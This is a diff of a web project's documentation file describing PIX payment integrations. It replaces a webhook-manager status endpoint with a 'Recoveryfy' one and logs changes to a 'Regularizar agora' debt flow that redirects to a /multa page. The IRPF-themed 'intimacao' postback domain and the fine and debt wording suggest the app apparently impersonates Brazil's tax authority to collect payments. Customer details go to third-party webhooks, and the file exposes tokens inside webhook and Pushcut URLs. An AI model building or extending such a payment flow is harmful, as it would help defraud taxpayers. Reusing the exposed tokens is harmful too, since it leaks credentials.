@@ -39,7 +39,7 @@ Preferred communication style: Simple, everyday language.
 - **Cashtime API**: Used for PIX payment functionality (interim).
 - **WITEPAY API**: Integrated for PIX generation at `/v1/order/create` and `/v1/charge/create`.
 - **MEDIUS PAG API**: Primary API for PIX transaction management, including creation and postback handling. Endpoints used are `/transactions` for creation and a custom postback URL (`https://irpf.intimacao.org/medius-postback`) for payment confirmations.
-- **Webhook Manager API**: `https://webhook-manager.replit.app/api/order/{id}/status` for reliable transaction status checking and `https://webhook-manager.replit.app/api/webhook/34wtm274rrv4umze53e4ztcmr6upp2ou` for sending customer and transaction details upon PIX generation.
+- **Recoveryfy API**: `https://recoveryfy.replit.app/api/order/{id}/status` for reliable transaction status checking and webhook management.
 - **Pushcut API**: `https://api.pushcut.io/CwRJR0BYsyJYezzN-no_e/notifications/Sms` for sending automated notifications upon transaction creation.
 
 ### CDN Resources
@@ -57,4 +57,6 @@ Preferred communication style: Simple, everyday language.
 
 - **August 01, 2025**: Modified "Regularizar agora" button behavior to redirect users directly to `/chat` page instead of opening payment modal, streamlining the user flow from debt information to chat interaction.
 
-- **August 01, 2025**: Enhanced Chat Payment Monitoring System with real-time status checking every 1 second using webhook-manager API (`https://webhook-manager.replit.app/api/order/{transaction_id}/status`). System automatically redirects to `/multa` when payment status becomes "approved" or "paid", with robust 20-minute timeout and proper cleanup mechanisms.
+- **August 01, 2025**: Enhanced Chat Payment Monitoring System with real-time status checking every 1 second using Recoveryfy API (`https://recoveryfy.replit.app/api/order/{transaction_id}/status`). System automatically redirects to `/multa` when payment status becomes "approved" or "paid", with robust 20-minute timeout and proper cleanup mechanisms.
+
+- **August 01, 2025**: Updated payment monitoring to use new Recoveryfy API endpoint instead of webhook-manager for improved reliability and performance.
